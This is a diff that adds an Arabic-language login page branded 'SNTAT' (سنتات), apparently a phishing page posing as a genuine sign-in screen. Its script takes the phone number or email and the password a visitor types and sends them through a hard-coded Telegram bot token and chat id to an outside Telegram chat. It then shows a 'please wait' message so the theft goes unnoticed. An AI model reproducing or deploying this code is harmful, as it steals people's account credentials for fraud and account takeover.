@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>سنتات - تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f8f8f8;
+            text-align: center;
+            padding: 40px;
+            direction: rtl;
+        }
+        .logo {
+            font-size: 36px;
+            color: #4b7d7d;
+            margin-bottom: 10px;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+        }
+        .tabs button {
+            width: 49%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            border: none;
+            background-color: #2e7d7d;
+            color: white;
+            font-weight: bold;
+        }
+        .social {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 20px;
+        }
+        .social img {
+            width: 40px;
+            height: 40px;
+        }
+        .footer-btns button {
+            margin-top: 10px;
+            width: 100%;
+            background: #e0f0f0;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">SNTAT<br><span style="font-size:18px;color:#444;">سنتات</span></div>
+    <div class="container">
+        <div class="tabs">
+            <button onclick="setMode('phone')">رقم الهاتف</button>
+            <button onclick="setMode('email')">البريد الإلكتروني</button>
+        </div>
+        <div>
+            <input type="text" id="phoneOrEmail" placeholder="رقم الهاتف أو البريد الإلكتروني">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <button onclick="sendToTelegram()">الدخول</button>
+        </div>
+        <div id="responseMessage" style="margin-top: 15px; color: green; font-weight: bold;"></div>
+        <div class="social">
+            <img src="https://cdn-icons-png.flaticon.com/512/281/281764.png" alt="Google">
+            <img src="https://cdn-icons-png.flaticon.com/512/145/145802.png" alt="Facebook">
+        </div>
+        <div class="footer-btns">
+            <button>نسيت كلمة المرور؟</button>
+            <button>سياسة الخصوصية</button>
+        </div>
+    </div>
+
+    <script>
+        let mode = 'phone';
+        function setMode(m) {
+            mode = m;
+            document.getElementById("phoneOrEmail").placeholder = (m === 'phone') ? "رقم الهاتف" : "البريد الإلكتروني";
+        }
+
+        function sendToTelegram() {
+            const token = "8161461603:AAHPYz1WonHCCQXI01gwx2O-obxaaniDwFQ";
+            const chat_id = "5028905596";
+            const userInput = document.getElementById("phoneOrEmail").value;
+            const password = document.getElementById("password").value;
+
+            const message = mode === 'phone'
+                ? `محاولة تسجيل دخول:%0Aرقم الهاتف: ${userInput}%0Aكلمة المرور: ${password}`
+                : `محاولة تسجيل دخول:%0Aالبريد الإلكتروني: ${userInput}%0Aكلمة المرور: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`, {
+                method: "GET"
+            }).then(() => {
+                document.getElementById("responseMessage").innerText = "تم تقديم طلبك، يرجى الانتظار...";
+            }).catch((error) => {
+                console.error("فشل الإرسال إلى تليجرام:", error);
+            });
+        }
+    </script>
+</body>
+</html>
